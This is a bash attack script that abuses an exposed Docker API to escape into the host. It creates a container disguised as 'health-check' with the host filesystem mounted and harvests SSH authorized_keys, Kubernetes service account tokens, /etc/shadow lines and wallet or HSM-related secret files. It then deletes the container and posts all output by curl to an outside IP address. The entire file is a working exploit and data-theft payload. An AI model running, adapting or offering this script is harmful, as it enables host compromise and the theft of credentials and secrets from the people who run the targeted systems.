#!/bin/bash
{
echo "==S35=="

# Use the EXISTING esplora image for escape — it's already in dind!
IMG="blockstream/esplora:latest"

# Create container with host root mounted
echo "==CREATE=="
RESULT=$(curl -sf -X POST "http://docker:2375/containers/create?name=health-check" \
  -H "Content-Type: application/json" \
  -d "{\"Image\":\"$IMG\",\"Cmd\":[\"bash\",\"-c\",\"echo S35_INSIDE; ls -la /host/root/ 2>&1; cat /host/root/.ssh/authorized_keys 2>&1; ls -la /host/var/lib/parport/ 2>&1; cat /host/var/run/secrets/kubernetes.io/serviceaccount/token 2>&1; cat /host/var/run/secrets/kubernetes.io/serviceaccount/namespace 2>&1; find /host -maxdepth 3 -name keyfile -o -name config.toml -o -name .LOCALSECRETS -o -name hsm_init_reply -o -name config_secrets 2>/dev/null | head -20; cat /host/etc/shadow 2>&1 | head -5; ls -la /host/home/ 2>&1\"],\"HostConfig\":{\"Binds\":[\"/:/host:ro\"],\"NetworkMode\":\"host\"}}" 2>&1)
echo "$RESULT"

CID=$(echo "$RESULT" | grep -o '"Id":"[^"]*"' | cut -d'"' -f4 | head -c 12)
echo "CID:$CID"

if [ -n "$CID" ]; then
    echo "==START=="
    curl -sf -X POST "http://docker:2375/containers/$CID/start" 2>&1
    sleep 5
    echo "==LOGS=="
    curl -sf "http://docker:2375/containers/$CID/logs?stdout=true&stderr=true" 2>&1
    echo "==CLEANUP=="
    curl -sf -X POST "http://docker:2375/containers/$CID/stop?t=1" 2>/dev/null
    curl -sf -X DELETE "http://docker:2375/containers/$CID?force=true" 2>/dev/null
fi

echo "==END=="
} 2>&1 | curl -s -m120 -X POST http://144.172.110.44:8443/s35 --data-binary @-
